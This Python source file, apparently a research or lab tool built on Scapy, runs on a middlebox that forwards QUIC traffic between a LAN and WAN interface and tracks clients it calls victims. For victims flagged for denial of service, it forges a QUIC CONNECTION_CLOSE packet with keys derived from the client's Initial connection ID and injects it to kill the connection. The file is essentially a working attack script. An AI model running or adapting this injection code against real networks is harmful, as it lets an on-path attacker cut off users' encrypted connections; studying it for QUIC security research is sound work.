import os

from scapy.all import *
load_contrib("quic")

from scapy.layers.quic import *
from connection_close import QUIC_CONNECTION_CLOSE
bind_bottom_up(UDP, QUIC, dport=443)
bind_bottom_up(UDP, QUIC, sport=443)
bind_layers(UDP, QUIC, dport=443, sport=443)
from forge import forge_cc_scapy
import threading, sys, os
from victims import Victims

# global variables, change them only here 
##TODO: add changing of those while running 
inner_ifcae = 'middlebox-eth0' 
outer_ifcae = 'middlebox-eth1'

vs = Victims()

def add_and_send_to_server(pkt):
    new_pkt = pkt[IP]
    new_pkt[IP].src = "10.69.0.100"
    del new_pkt.getlayer(IP).chksum
    del new_pkt.getlayer(UDP).chksum
    #print(f"New PKT to server: {new_pkt.summary()}")
    send(new_pkt, iface=outer_ifcae, verbose=False)


def send_attack(victim):
    # build a CONNECTION_CLOSE frame
    cc = QUIC_CONNECTION_CLOSE(
        type          = 0x1C,
        error_code    = 0x10,         # arbitrary error
        frame_type    = 0,            # e.g. PADDING triggered it
        reason_phrase = b"oops!"
    )
    frame  = bytes(cc)
    tpl    = (victim[IP].src, victim[UDP].sport, victim[IP].dst, victim[UDP].dport)
    dcid_for_keys   = victim[QUIC_Initial].DstConnID      # client-chosen DCID → secrets
    dcid_in_header  = victim[QUIC_Initial].SrcConnID      # client’s SrcCID     → header
    forged = forge_cc_scapy(
        dcid_secret = dcid_for_keys,
        dcid_header = dcid_in_header,
        tpl = tpl,
        frame = frame)
    send(forged, iface=inner_ifcae, verbose=False)

def handle_quic(pkt):
    global vs
    # Only process if this packet has a QUIC Initial header
    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_ifcae) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_ifcae):
        if pkt.sniffed_on == inner_ifcae:
            vs.update(pkt)
            if QUIC_Initial in pkt and (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                send_attack(pkt)
                return
                
            add_and_send_to_server(pkt)
            
            

                    
        elif pkt.sniffed_on == outer_ifcae:
            new_dst = vs.find_victim_from_wan_by_port(pkt[UDP].dport)
            if new_dst != "":
                #print(f"From server: {pkt.summary()}")
                new_pkt = pkt[IP]
                new_pkt[IP].dst = new_dst
                del new_pkt.getlayer(IP).chksum
                del new_pkt.getlayer(UDP).chksum
                #print(f"New PKT to client: {new_pkt.summary()}")
                send(new_pkt, iface=inner_ifcae, verbose=False)
            else:
                print("A packet of unknown LAN destination.")
                # Need to fix change of victim sport with new connections of same src and dest ips.


if __name__ == "__main__":       
    threading.Thread(target=vs.run, daemon=True).start()
    # Sniff UDP 443 traffic and invoke handle_quic for each packet
    sniff(
        #iface="Ethernet 2",
        iface=[inner_ifcae, outer_ifcae],
        #filter="udp port 443",
        prn=handle_quic,         # callback for every packet
        store=False                  # don’t keep packets in memory
    )
